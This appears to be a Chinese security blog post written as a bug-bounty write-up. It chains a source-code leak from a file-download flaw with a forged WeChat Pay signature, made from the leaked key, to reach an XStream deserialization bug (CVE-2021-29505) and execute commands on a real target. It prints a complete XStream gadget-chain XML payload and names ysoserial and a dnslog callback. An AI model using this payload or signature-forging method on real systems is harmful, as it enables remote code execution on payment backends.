#  SRC挖掘 | 文件下载漏洞getshell   
 不秃头的安全   2025-02-27 23:33  
  
# SRC挖掘 | 文件下载漏洞getshell  
```
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请私聊删除。需要加交流群在最下方。还在学怎么挖通用漏洞和src吗？
```  
```
知识星球在最下方，续费也有优惠私聊~~考证请加联系vx咨询
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fWk03j6mLJGFj2iaCr1xYe4GUXLZR0jt0VOIyq7lMA1oOVr5xXMaItQgwNiaR0ncbBs0tFsoiaVg58qA/640?wx_fmt=png "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVibxOp0mkgusYjICRtX72ibZgezpky11Wdhw4HHBgG87exneIatOETl1hntEkwoiczemjETgpgtg2WQ/640?wx_fmt=jpeg "")  
  
  
****  
之前挖到的文件下载漏洞，重新审计了一遍，发现了可以getshell的漏洞点，现在再写一篇文章分享漏洞思路。  
> 文件下载漏洞  
  
> 有恒，公众号：有恒安全[一次文件下载漏洞获取源代码审计]()  
  
  
  
  
0**、漏洞回顾**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOQm1Y64WNianz7ib57rEdD8QklEs31B11GRe2tI5D23AXxcc3af0GjibKQ/640?wx_fmt=png "")  
  
  
**1、代码审计**  
  
查看导入的外部库，发现使用了xstream组件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOUZdkeHHbsURBsfFcIym803nIpnjg8SRwxfkQVW292bzPPHQy4tFoWQ/640?wx_fmt=png "")  
  
在xstream1.4.9版本中，存在反序列化漏洞，可以执行任意命令，漏洞详情可以参考该文章。  
> XStream反序列化漏洞  
  
> Jerry，公众号：海狼风暴团队[CVE-2021-29505 XStream 反序列化命令执行漏洞]()  
  
  
  
  
该方法中使用了xstream组件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOPswBfdv1WskYKnaUg8h2nPMtZuu3ecQ72U6CgoIRicezwMOlw6iceLjQ/640?wx_fmt=png "")  
  
只要 ”  
if   
(  
this  
.wXPay.isResponseSignatureValid(notifyMap)) {“  
  
返回true，就可以执行getObjectFromXML方法  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOFC7UhFj0pg3icvZ68qbP8nY0aK3ZGicefDPLHVjXmicWJQBr1jJ3303VA/640?wx_fmt=jpeg "")  
  
跟进去isResponseSignatureValid判断方法，这里要传入key，sing类型等参数，查看该方法的代码逻辑。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOr5GyYib3OqT4MjqRs3yp1MnOtOasWLicicsskcxeGXAHGyMBNWR6MqDqA/640?wx_fmt=png "")  
  
判断传入的参数是否有sign，如果有sign，就判断sign是否正确  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOicn6oYQSuia4GKdV1NNxxBZeLtsaiavo4t2pYypd2WGVqTsmNXYBiauE7g/640?wx_fmt=png "")  
  
生成sign的逻辑  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOSVbAnhrlhHUz5bFbQknbtia4AtoHgOYYVuM4cIPM6lOoJ9OLSz99a0Q/640?wx_fmt=png "")  
  
  
这个是微信支付SDK中的一个工具方法，用于验证接收到的数据签名是否有效，这个方法生成的sign签名比较复杂，可以将该方法复制到自己本地的测试代码中进行调试。  
  
  
找到对应的配置信息，  
this  
.  
config  
.getKey，  
this  
.  
signType，  
将参数传入到方法里面  
  
this  
.  
config  
.getKey：  
  
this  
.  
signType  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOciciaRe7BKKgglwvGpuwyVTloNz0TQM72Wey7BKGhwcjOakkCGdFnf6w/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOOgg1VFsCszQ9UrfNwuFDU6TvkWA5IngbWavae3Q7XIwHKOv2lH6whQ/640?wx_fmt=png "")  
  
  
通过搜索WXPayConfig与WXPay，找到对应的配置xml文件  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjORV9B9UJm6b64egPMxVo2FDpibFEE4VO5Oh6d7XNkJfS9cGuT58KPFPA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOHstVyic8BibTZpCENicosBVNl8nsSX9sXibh9CaZwxP7te8hIaaGbWz02g/640?wx_fmt=png "")  
  
  
  
  
再通过搜索wxpay.appID，wxpay.useSanBox等信息，找到对应的配置信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjO20EanMfmOicuzTJVWQ7xrTlmCibdXM9l1S0QrVFia7w656bA8GsYn15Uw/640?wx_fmt=png "")  
  
  
**2、本地代码演示**  
  
复制配置信息到本地测试代码，创建一个新的 WXPay 实例，调用刚才的isResponseSignatureValid方法，将找到的配置信息传入进去,在生成sign签名的代码打上断点，进行调试sign签名。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOsC1KuJKjaAOBFdqR3GZYLic5ic1icf7gW4JrphibicOACBRVvHR2LWzbLVw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOOFQQUIRSHbt0a2gqB2RBic3UgBX3EibVrusLCIyjNTeMq68pfOG6y0hg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOuRZVx6OpZLJQ1AfnoeVITB3qIG5JyXKRHcalwqzbDSjtMjEB5as7jg/640?wx_fmt=png "")  
  
使用ysoserial-all.jar工具,执行calc命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOAEhiaMcTibNpfic9dQFAYfxldGMqLHdGowuUPycsnJNX2eTucc8Sad9Ow/640?wx_fmt=png "")  
  
构造数据包，该数据包是访问本地的1099端口执行cc6利用链  
  
```
<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>
                            <soapPart/>
                            <mm>
                                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                                    <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                        <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                            <names>
                                                <string>aa</string>
                                                <string>aa</string>
                                            </names>
                                            <ctx>
                                                <environment/>
                                                <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                                    <java.rmi.server.RemoteObject>
                                                        <string>UnicastRef</string>
                                                        <string>127.0.0.1</string>
                                                        <int>1099</int>
                                                        <long>0</long>
                                                        <int>0</int>
                                                        <long>0</long>
                                                        <short>0</short>
                                                        <boolean>false</boolean>
                                                    </java.rmi.server.RemoteObject>
                                                </registry>
                                                <host>127.0.0.1</host>
                                                <port>1099</port>
                                            </ctx>
                                        </candidates>
                                    </aliases>
                                </it>
                            </mm>
                        </multiPart>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
<sign>123</sign>
</java.util.PriorityQueue>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOmIw2gNlsibuK36Oic35GBs2ywkIgMXVgmMtMAH5LRX9dmK7y8V2TSLqQ/640?wx_fmt=png "")  
  
最后调试出sign签名。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOWgMNXoIRJIBDptkfFYD2ZMWeRiajT5Vhpz9fX4hppxcAGwFwa2rib93A/640?wx_fmt=png "")  
  
重新将刚才的sign签名转化为大写，复制到数据包中，再请求一次。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOJrWzk0kPcrSDOBPqiaKV26fJBwicM7EjrgMTyvQ5fUVll58V1B9ptx5w/640?wx_fmt=png "")  
  
****  
成功进入到getObjectFromXML方法里面。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjO8ZaZlPF4UVpiae3vvynwvOl50nDgicgmb1IG3PFbNoIvvsSyHicOMsY2Q/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOw1niaWbnWjGdHrbqZnzGhW94nTgRuekktex4McAGozoXhWQ1OmZa7Jw/640?wx_fmt=png "")  
  
  
成功执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOc7HpSicIBzCZvibLrCPsud1IviarXApXUlGXPzxibbiaa6mxia7ZDBgszEjw/640?wx_fmt=png "")  
  
  
**3、漏洞复现**  
  
步骤相同，在云服务器使用ysoserial-all.jar工具，执行ping dnslog命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOUaBJ99iaoCR8YFksCmy8OiaIia8WWYkCrgic5wvbTOx3CPIBjzdlFmJljw/640?wx_fmt=png "")  
  
  
登录后台系统，构造数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjO7rKnDnuMOaMgxo4X0h4vcVXFZNO6WicgtbJqg6y0JN8oiaXDibPOfpIpQ/640?wx_fmt=png "")  
  
****  
按刚才的步骤重新生成sign签名，构造数据包发送，host改为自己服务器的ip。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOpVuhOy9GPmDjvxpEj5mRBkXHp5VlAXtaqH71T6POxibABVxQqwkLfnA/640?wx_fmt=png "")  
  
  
服务器收到目标的请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOpzyeSlcV0GeVicv1icrFmjDiadnw0WSOTsmvqwNULEGXkmgfQKdH0LUyQ/640?wx_fmt=png "")  
  
dnslog收到目标的ping回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1UibibcVguVxibd9NWbmDqfPfIjOrnw5SHic9j4EdUuN9Xon3AM3gRicnaxt7SVbNo0ibIDHpFic2GALq0yTibA/640?wx_fmt=png "")  
  
往期推荐：  
  
[渗透实战 | EDUSRC漏洞挖掘技巧汇总+信息收集各种姿势](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488602&idx=1&sn=9d66e766fbaea382276398164d838e9b&scene=21#wechat_redirect)  
  
  
[渗透实战 | 从JS接口到拿下2k家学校的超管权限](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488597&idx=1&sn=6bc1ae519ecdeb9794090a270a3a389d&scene=21#wechat_redirect)  
  
  
[实战内测-某内测项目站点FUZZ到SQL注入](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488589&idx=1&sn=e3747e980514fb886d930c96a5f34e4e&scene=21#wechat_redirect)  
  
  
[OLLAMA的安全威胁？快去自查一下吧！](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488522&idx=1&sn=5acc1b14d65b7d0f8e2fe7f44c1826e8&scene=21#wechat_redirect)  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/5XMBWuTy1YdnTAAczP5ENGmlT9xMEAsJuTqV6jib7IyxImNprOeHxrbPLFkKfEPfh2U829KgfaTYB6NLOmx9Ykg/640?wx_fmt=png "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持，考证请加联系vx咨询。  
  
  
  
**关注福利：**  
  
回复“  
google工具  
" 获取 google语法生成工具  
  
回复“  
小程序渗透工具  
" 获取 小程序渗透工具  
  
回复“  
暴力破解字典  
" 获取 各种常用密码字典打包  
  
回复“  
typora激活  
" 获取 最新typora激活程序  
  
回复“  
蓝队工具箱  
”即可获取一款专业级应急响应的集成多种工具的工具集  
  
  
**知识星球**  
  
星球里有什么？年前最后一次优惠速来咨询  
  
CNVD、EDU及SRC赏金，攻防演练资源分享(免杀，溯源，钓鱼等)，各种新鲜好用工具，最新poc定期更新，  
以及一些好东西  
（  
还在学怎么挖通用漏洞吗快来加入  
），16个专栏会持续更新~  
**提前续费有优惠，好用不贵很实惠**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fXSPl8ibuX2P3oHCH6B7MrRYQSa51rqRWCefvVO8WzoNjhcOO2JHtIR51hrGrdibnCpIjcxTp4Kpcqg/640?wx_fmt=png "")  
  
  
**交流群-过期后加微信拉**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVYqTDicz1u5b4vag8Lr8TuwnSBOSPQkjpFwy8owWic7gQEZkOyyhcDgLTic40sr1uvS5No5pqLyR2jA/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fWtvJ64zYJRfiarp9ibX1TmYOeNgHrdaLJsckleVG5tjoylBzq1YiaQl3dNt3XvCszdCVLib8mcsG9BCQ/640?wx_fmt=png "")  
  
****  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/icjIKcQsgZ0q8U9MOMKkIGEGjAcDMjOXuW6eYDOur79SYFak4z5Pu5v6liaPDvuaAVGKSibvBnKiaRFiaHvBDYwsfAQ/640?wx_fmt=png "")  
  
**安全考证**  
  
需要考以下各类安全证书的可以联系我，  
绝对低价绝对优惠、组团更便宜，报名成功先送星球一年，  
CISP  
、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001、IT服务项目经理......  
巨优惠  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVicVKjibDEuQ9Kib0ia6TibrVmoFRWyXqReDwUhDas8kOqD29OfTA4XzqZjgw1pn8OYibtFfQxvPJq4kNg/640?wx_fmt=jpeg "")  
  
  
